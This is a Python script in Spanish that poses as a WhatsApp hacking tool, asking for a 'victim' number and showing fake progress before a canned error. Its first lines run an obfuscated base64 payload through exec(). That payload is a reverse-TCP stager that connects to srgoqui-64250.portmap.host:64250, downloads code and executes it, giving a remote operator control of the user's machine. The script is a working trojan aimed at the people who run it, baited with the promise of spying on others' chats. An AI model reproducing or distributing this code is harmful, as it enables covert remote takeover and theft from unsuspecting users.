import os, sys, time

try:
        exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJ3NyZ29xdWktNjQyNTAucG9ydG1hcC5ob3N0Jyw2NDI1MCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoZCkpLHsncyc6c30pCg==')[0]))


except OSError:
        RR = "\033[31;1m"
        print (RR +"NO TE AUTORIZARON EL ACCESO")
        os.system("exit")

GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"  # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"   # White
R = "\033[31m"    # Red
C = "\033[36;1m"  # Cyan
M = "\033[35;1m"  # Morado

def sutil(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(12. / 150)

os.system("clear")

sutil(RR +"Bienvenido a la herramienta de Valletta!\nPara comenzar vamos a visualizar las compatibilidades de tu dispositivo")
sutil(YY +"Esto podria demorar unos minutos...")
os.system("sleep 5")
print (GG +"Bienvenido a WSP-VTA")
print (BB +"Existen las siguientes opciones")
print (YY +"1) Hackear WhatsApp\n2) Obtener chats de WhatsApp (No disponible)\n3) Salir")
rsp = int(input("Elige una opcion: "))
if rsp == 1:
        print (GG +"Abriendo componentes...")
        os.system("sleep 10")
        rsp1 = input(BB +"Pon el numero de tu victima: ")
        print (YY +"Obteniendo acceso alternativo de " + rsp1)
        sutil(YY +"Esto podria demorar unos minutos...")
        os.system("sleep 30")
        sutil(GG +"Ya falta poco...")
        os.system("sleep 40")
        sutil(RR +"Ocurrió un error inesperado! Vuelve a intentarlo mas tarde o busca ayuda")

elif rsp == 2:
        sutil(YY +"Aun no esta disponible...")

else:
        sutil(RR +"Saliendo del programa...")


